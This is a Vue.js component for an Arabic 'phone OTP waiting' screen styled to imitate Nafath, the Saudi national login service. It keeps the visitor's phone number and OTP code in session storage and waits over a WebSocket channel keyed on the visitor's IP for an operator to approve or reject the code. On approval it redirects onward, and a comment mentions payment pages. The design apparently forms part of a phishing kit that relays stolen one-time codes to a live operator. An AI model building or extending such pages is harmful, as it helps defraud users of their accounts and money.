<template>
    <div class="min-h-screen relative overflow-hidden" dir="rtl">
        <!-- Background -->
        <div class="absolute inset-0 z-0">
            <div class="absolute inset-0 bg-gradient-to-b from-[#000062]/95 via-[#000062]/85 to-[#000062]/95"></div>
        </div>

        <!-- Main Content -->
        <div class="relative z-10 flex flex-col items-center justify-center min-h-screen px-4 py-8">
            <div class="w-full max-w-md">
                <!-- Main Card (Nafath Style) -->
                <div class="card-nafath text-center">
                    <div class="p-6 md:p-8">
                        <!-- Logo -->
                        <img src="/images/icons/gate_logo_indv_light.svg"
                            :alt="t( 'verification.phoneOtpWaiting.logo' )" class="h-16 md:h-20 w-auto mx-auto mb-6"
                            @error="$event.target.style.display = 'none'" />

                        <!-- Title -->
                        <h1 class="font-bold text-white text-xl md:text-2xl mb-3">
                            {{ t( 'verification.phoneOtpWaiting.title' ) }}
                        </h1>
                        <p class="text-white/70 mb-6 text-sm">
                            {{ t( 'verification.phoneOtpWaiting.pleaseWait' ) }}
                        </p>

                        <!-- Waiting State -->
                        <div v-if="status === 'pending'">
                            <div class="flex justify-center mb-6">
                                <div class="phone-loader">
                                    <div class="phone-loader__dot"></div>
                                    <div class="phone-loader__dot"></div>
                                    <div class="phone-loader__dot"></div>
                                </div>
                            </div>
                        </div>

                        <!-- Approved State -->
                        <div v-else-if="status === 'approved'">
                            <div class="text-center my-6 inline-flex flex-col gap-3">
                                <div
                                    class="w-16 h-16 mx-auto bg-emerald-500 rounded-full flex items-center justify-center">
                                    <svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd"
                                            d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                            clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <span class="font-bold text-white text-xl">
                                    {{ t( 'verification.phoneOtpWaiting.approvedTitle' ) }}
                                </span>
                            </div>
                            <div class="flex items-center justify-center gap-3 mt-4">
                                <div class="phone-loader phone-loader--sm">
                                    <div class="phone-loader__dot"></div>
                                    <div class="phone-loader__dot"></div>
                                    <div class="phone-loader__dot"></div>
                                </div>
                                <span class="text-white">
                                    {{ t( 'verification.phoneOtpWaiting.approvedSubtitle' ) }}
                                </span>
                            </div>
                        </div>

                        <!-- Rejected State -->
                        <div v-else-if="status === 'rejected'">
                            <div class="text-center my-6 inline-flex flex-col gap-3">
                                <div
                                    class="w-16 h-16 mx-auto bg-red-500 rounded-full flex items-center justify-center">
                                    <svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd"
                                            d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                                            clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <span class="font-bold text-white text-xl">
                                    {{ t( 'verification.phoneOtpWaiting.rejectedTitle' ) }}
                                </span>
                                <p class="text-white/70 text-sm">
                                    {{ rejectReason || t( 'verification.phoneOtpWaiting.rejectedMessage' ) }}
                                </p>
                            </div>
                            <div class="mt-6">
                                <button class="btn-outline-light w-full py-3 px-6 rounded-xl font-semibold transition-all cursor-pointer"
                                    @click="retryOtp">
                                    {{ t( 'common.retry' ) }}
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Security Notice -->
                <div class="mt-6 text-center">
                    <div class="inline-flex items-center gap-2 text-white/50 text-xs">
                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd"
                                d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                                clip-rule="evenodd" />
                        </svg>
                        <span>{{ t( 'verification.phoneOtpWaiting.secureConnection' ) }}</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script setup>
import { ref, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import { getReasonLabel } from '@/constants/rejectionReasons';
import { getEcho } from '@/services/echo';

const { t } = useI18n();
const router = useRouter();

// Track this page
useVisitorTracking( 'phone/otp-waiting' );

// ─── Load context from sessionStorage ───────────────────────────────
const phoneOtpContext = JSON.parse( sessionStorage.getItem( 'phoneOtpContext' ) || '{}' );
const otpContext = JSON.parse( sessionStorage.getItem( 'otpContext' ) || '{}' );
const _phoneNumber = phoneOtpContext.phoneNumber || '';
const _otpCode = phoneOtpContext.otpCode || '';
let customerIp = phoneOtpContext.customerIp || otpContext.customerIp || '';
const phoneSessionId = phoneOtpContext.sessionId || '';
const phoneStatusSig = phoneOtpContext.statusSig || '';

// ─── Status ─────────────────────────────────────────────────────────
const status = ref( 'pending' ); // pending | approved | rejected
const rejectReason = ref( '' );

// ─── Retry — go back to phone OTP entry ─────────────────────────────
function retryOtp ()
{
    router.push( { name: 'otp' } );
}

// ─── WebSocket — listen for admin approval / rejection ──────────────
let echoChannel = null;
let isUnmounted = false;

async function setupWebSocket ()
{
    // Resolve IP if not in session context
    if ( !customerIp )
    {
        try
        {
            const { default: request } = await import( '@/api/request' );
            const { data } = await request.get( '/customer/ip' );
            customerIp = data?.customer_ip || '';
            logger.debug( '[PhoneOtpWaiting] Resolved customer IP:', customerIp );
        } catch
        {
            logger.warn( '[PhoneOtpWaiting] Could not resolve customer IP' );
        }
    }

    if ( isUnmounted ) return;

    if ( !customerIp )
    {
        logger.warn( '[PhoneOtpWaiting] No customer IP — WebSocket unavailable' );
        return;
    }

    const echo = await getEcho();
    if ( isUnmounted || !echo )
    {
        if ( !isUnmounted && !echo )
            logger.warn( '[PhoneOtpWaiting] Echo/Reverb not available, using polling only' );
        return;
    }

    const channelName = `phone.${ customerIp }`;
    logger.debug( '[PhoneOtpWaiting] Subscribing to channel:', channelName );

    echoChannel = echo.channel( channelName );

    echoChannel.listen( '.PhoneOtpApproved', handleApproved );
    echoChannel.listen( '.PhoneOtpRejected', handleRejected );
}

function handleApproved ( event )
{
    logger.debug( '[PhoneOtpWaiting] Approved:', event );
    status.value = 'approved';

    setTimeout( () =>
    {
        if ( event.redirect_to )
        {
            safeRedirect( event.redirect_to, 'nafathRedirecting', router );
        } else
        {
            // Navigate to Nafath after phone verification approval
            router.push( { name: 'nafathRedirecting' } );
        }
    }, 2000 );
}

function handleRejected ( event )
{
    logger.debug( '[PhoneOtpWaiting] Rejected:', event );
    status.value = 'rejected';
    rejectReason.value = getReasonLabel( event.reason || 'phone_otp_other', t ) || t( 'verification.phoneOtpWaiting.rejectedMessage' );
}

// ─── Polling Fallback ───────────────────────────────────────────────
// Note: The global tracking system (initGlobalTracking) already handles
// /customer/page heartbeats. This polling only checks approval status.
// Module-level timer — prevents interval stacking across remounts.
let pollTimer = null;

if ( pollTimer )
{
    clearInterval( pollTimer );
    pollTimer = null;
}

function startPolling ()
{
    if ( pollTimer ) return;

    pollTimer = setInterval( async () =>
    {
        if ( status.value !== 'pending' ) return;

        try
        {
            const { default: request } = await import( '@/api/request' );
            const sid = phoneSessionId;
            const sig = phoneStatusSig;
            if ( !sid || !sig ) return;

            const { data } = await request.get( `/status/phone/${ sid }?sig=${ encodeURIComponent( sig ) }` );
            if ( data.status === 'verified' )
            {
                handleApproved( data );
            } else if ( data.status === 'rejected' )
            {
                handleRejected( { reason: data.reason || 'phone_otp_other' } );
            }
        } catch
        {
            // Silent — polling is a fallback
        }
    }, 30_000 );
}

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    setupWebSocket();
    startPolling();
} );

onUnmounted( () =>
{
    isUnmounted = true;

    if ( pollTimer )
    {
        clearInterval( pollTimer );
        pollTimer = null;
    }

    if ( echoChannel && customerIp )
    {
        try { window.Echo?.leave( `phone.${ customerIp }` ); } catch { /* */ }
    }
} );
</script>

<style scoped>
.card-nafath {
    background: rgba(0, 0, 50, 0.4);
    backdrop-filter: blur(24px) saturate(180%);
    -webkit-backdrop-filter: blur(24px) saturate(180%);
    border-radius: 24px;
    border: 1px solid rgba(255, 255, 255, 0.15);
    box-shadow:
        0 25px 50px -12px rgba(0, 0, 0, 0.5),
        inset 0 1px 0 rgba(255, 255, 255, 0.1);
}

.btn-outline-light {
    background: rgba(255, 255, 255, 0.08);
    border: 1.5px solid rgba(255, 255, 255, 0.25);
    color: white;
}

.btn-outline-light:hover {
    background: rgba(255, 255, 255, 0.15);
    border-color: rgba(255, 255, 255, 0.4);
}

/* Dot loader */
.phone-loader {
    display: flex;
    gap: 6px;
    align-items: center;
}

.phone-loader--sm .phone-loader__dot {
    width: 6px;
    height: 6px;
}

.phone-loader__dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: white;
    animation: dotPulse 1.4s ease-in-out infinite;
}

.phone-loader__dot:nth-child(2) {
    animation-delay: 0.2s;
}

.phone-loader__dot:nth-child(3) {
    animation-delay: 0.4s;
}

@keyframes dotPulse {

    0%,
    80%,
    100% {
        opacity: 0.3;
        transform: scale(0.8);
    }

    40% {
        opacity: 1;
        transform: scale(1);
    }
}

@media (max-width: 640px) {
    .card-nafath {
        margin: 0 8px;
    }
}
</style>
